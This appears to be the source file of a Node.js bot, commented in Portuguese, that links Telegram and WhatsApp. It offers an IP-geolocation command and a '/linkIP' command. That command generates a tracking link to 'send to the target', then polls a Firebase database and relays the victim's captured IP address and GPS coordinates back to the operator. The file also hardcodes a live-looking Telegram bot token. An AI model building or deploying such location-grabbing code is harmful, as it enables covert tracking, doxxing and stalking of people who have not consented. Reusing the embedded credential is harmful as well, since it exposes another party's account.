const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const https = require('https');
const http = require('http');

// Servidor HTTP básico exigido pelo Render para manter o serviço ativo 24h
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot ZRX Rodando 24 Horas!\n');
}).listen(PORT, () => {
    console.log(`Servidor HTTP rodando na porta ${PORT}`);
});

const TELEGRAM_TOKEN = '8622724732:AAFVKNCfcYIlZqfSGmnK23Urt1VAVy1kPHE';
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });

let waSock = null;
let jaNotificouConectado = false;
let reconectando = false;

function consultarAPI(url) {
    return new Promise((resolve, reject) => {
        https.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try { resolve(JSON.parse(data)); } catch (e) { resolve(data); }
            });
        }).on('error', (err) => reject(err));
    });
}

function salvarFirebase(caminho, dados) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(`https://linkapi1-zrx-default-rtdb.firebaseio.com/${caminho}.json`);
        const dataStr = JSON.stringify(dados);

        const req = https.request({
            hostname: urlObj.hostname,
            path: urlObj.pathname,
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(dataStr)
            }
        }, (res) => {
            let resData = '';
            res.on('data', chunk => resData += chunk);
            res.on('end', () => resolve(resData));
        });

        req.on('error', err => reject(err));
        req.write(dataStr);
        req.end();
    });
}

function buscarFirebase(caminho) {
    return consultarAPI(`https://linkapi1-zrx-default-rtdb.firebaseio.com/${caminho}.json`);
}

async function iniciarWhatsApp(chatId, numeroTelefone) {
    if (reconectando) return;
    reconectando = true;

    const pastaSessao = path.join(__dirname, 'sessao_teste');
    const { state, saveCreds } = await useMultiFileAuthState(pastaSessao);

    waSock = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });

    waSock.ev.on('creds.update', saveCreds);

    waSock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const status = lastDisconnect?.error?.output?.statusCode;
            console.log(`Conexão fechada com status: ${status}`);
            jaNotificouConectado = false;

            if (status === DisconnectReason.loggedOut) {
                reconectando = false;
                if (chatId) bot.sendMessage(chatId, "⚠️ Desconectado do WhatsApp. Use `/limpar` e conecte novamente.");
                return;
            }

            setTimeout(() => {
                reconectando = false;
                iniciarWhatsApp(chatId, numeroTelefone);
            }, 5000);

        } else if (connection === 'open') {
            reconectando = false;
            console.log("WhatsApp conectado com sucesso!");
            
            if (chatId && !jaNotificouConectado) {
                jaNotificouConectado = true;
                bot.sendMessage(chatId, "✅ **Conectado com sucesso!**", { parse_mode: 'Markdown' });
            }
        }
    });

    waSock.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const msg = messages[0];
            if (!msg.message) return;

            const remoteJid = msg.key.remoteJid;
            const texto = msg.message.conversation || msg.message.extendedTextMessage?.text || '';

            if (!texto) return;
            console.log(`Mensagem recebida de ${remoteJid}:${texto}`);

            if (texto.trim() === '/menu') {
                const menuTexto = 
                    `🤖 *MENU DE COMANDOS - ZRX*\n\n` +
                    `📌 \`/ip <endereço>\` - Consulta informações de um IP via ipinfo.io\n` +
                    `🔗 \`/linkIP\` - Gera um link personalizado de captura integrado ao Firebase\n\n` +
                    `Envie o comando desejado!`;
                
                await waSock.sendMessage(remoteJid, { text: menuTexto });
            }
            else if (texto.startsWith('/ip ')) {
                const ipAlvo = texto.replace('/ip', '').trim();
                if (!ipAlvo) {
                    await waSock.sendMessage(remoteJid, { text: '❌ Por favor, informe um IP. Exemplo: `/ip 8.8.8.8`' });
                    return;
                }

                const dadosIp = await consultarAPI(`https://ipinfo.io/${ipAlvo}/json`);
                if (dadosIp.error) {
                    await waSock.sendMessage(remoteJid, { text: `❌ Erro: ${dadosIp.error.title || 'IP não encontrado'}` });
                    return;
                }

                const respostaIp = 
                    `🌐 *RESULTADO IP* 🌐\n\n` +
                    `• *IP:* ${dadosIp.ip || 'N/A'}\n` +
                    `• *Hostname:* ${dadosIp.hostname || 'N/A'}\n` +
                    `• *Cidade:* ${dadosIp.city || 'N/A'}\n` +
                    `• *Região:* ${dadosIp.region || 'N/A'}\n` +
                    `• *País:* ${dadosIp.country || 'N/A'}\n` +
                    `• *Org/Provedor:* ${dadosIp.org || 'N/A'}\n` +
                    `• *Localização (GPS):* ${dadosIp.loc || 'N/A'}`;

                await waSock.sendMessage(remoteJid, { text: respostaIp });
            }
            else if (texto.trim() === '/linkIP') {
                const idUnico = 'zrx_' + Math.random().toString(36).substring(2, 8);
                const linkGerado = `https://wv0304362-bot.github.io/linkApi1-/?id=${idUnico}`;

                await salvarFirebase(`capturas/${idUnico}`, { status: 'aguardando', criado_em: new Date().toISOString() }).catch(() => {});

                await waSock.sendMessage(remoteJid, { 
                    text: `🔗 *LINK GERADO COM SUCESSO*\n\n` +
                          `Envie o link abaixo para o alvo:\n${linkGerado}\n\n` +
                          `_Assim que ele abrir e carregar, os dados cairão aqui!_` 
                });

                const intervaloVerificacao = setInterval(async () => {
                    try {
                        const dadosCapturados = await buscarFirebase(`capturas/${idUnico}`);
                        if (dadosCapturados && dadosCapturados.ip && dadosCapturados.ip !== 'Desconhecido' && dadosCapturados.timestamp) {
                            clearInterval(intervaloVerificacao);

                            const lat = dadosCapturados.location?.lat || 'Negado';
                            const lon = dadosCapturados.location?.lon || 'Negado';
                            const ipCapturado = dadosCapturados.ip || 'Desconhecido';

                            const alertaMsg = 
                                `🚨 *DADOS CAPTURADOS!* 🚨\n\n` +
                                `🌐 *IP:* ${ipCapturado}\n` +
                                `📍 *Latitude:* ${lat}\n` +
                                `📍 *Longitude:* ${lon}\n` +
                                `🕒 *Horário:* ${dadosCapturados.timestamp}`;

                            await waSock.sendMessage(remoteJid, { text: alertaMsg });
                        }
                    } catch (e) {}
                }, 3000);
            }
        } catch (erroMensagem) {
            console.error("Erro ao processar mensagem do WhatsApp:", erroMensagem);
        }
    });

    if (!state.creds.registered && numeroTelefone) {
        await delay(3000);
        try {
            const codigo = await waSock.requestPairingCode(numeroTelefone);
            if (chatId) {
                const mensagemLayout = `✅ **Conectado com sucesso**\n\nO código\n\`${codigo}\``;
                const opts = {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[{ text: '📋 Copiar Código', callback_data: `copiar_${codigo}` }]]
                    }
                };
                bot.sendMessage(chatId, mensagemLayout, opts);
            }
        } catch (error) {
            if (chatId) bot.sendMessage(chatId, "❌ Erro ao gerar o código de pareamento.");
        }
    }
}

bot.on('callback_query', async (callbackQuery) => {
    const data = callbackQuery.data;
    if (data.startsWith('copiar_')) {
        const codigo = data.replace('copiar_', '');
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: `Código ${codigo} copiado!`,
            show_alert: true
        });
    }
});

bot.onText(/\/limpar|\/desconectar/, async (msg) => {
    const chatId = msg.chat.id;
    const pastaSessao = path.join(__dirname, 'sessao_teste');

    try {
        if (waSock) {
            await waSock.logout().catch(() => {});
            waSock = null;
        }
        if (fs.existsSync(pastaSessao)) {
            fs.rmSync(pastaSessao, { recursive: true, force: true });
        }
        reconectando = false;
        jaNotificouConectado = false;
        bot.sendMessage(chatId, "🧹 Sessão limpa com sucesso! Use `/conectar SEU_NUMERO` para iniciar uma nova conexão.", { parse_mode: 'Markdown' });
    } catch (error) {
        bot.sendMessage(chatId, "❌ Erro ao tentar limpar os dados da sessão.");
    }
});

bot.onText(/\/conectar (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const numeroTelefone = match[1].replace(/\D/g, '');
    bot.sendMessage(chatId, `🔄 Solicitando código para o número: \`${numeroTelefone}\`...`, { parse_mode: 'Markdown' });
    await iniciarWhatsApp(chatId, numeroTelefone);
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "🤖 **Bot Telegram <-> WhatsApp Ativo!**\n\n• Para conectar: `/conectar SEU_NUMERO`\n• Para limpar sessão: `/limpar`", { parse_mode: 'Markdown' });
});

console.log("Bot do Telegram iniciado e escutando comandos!");
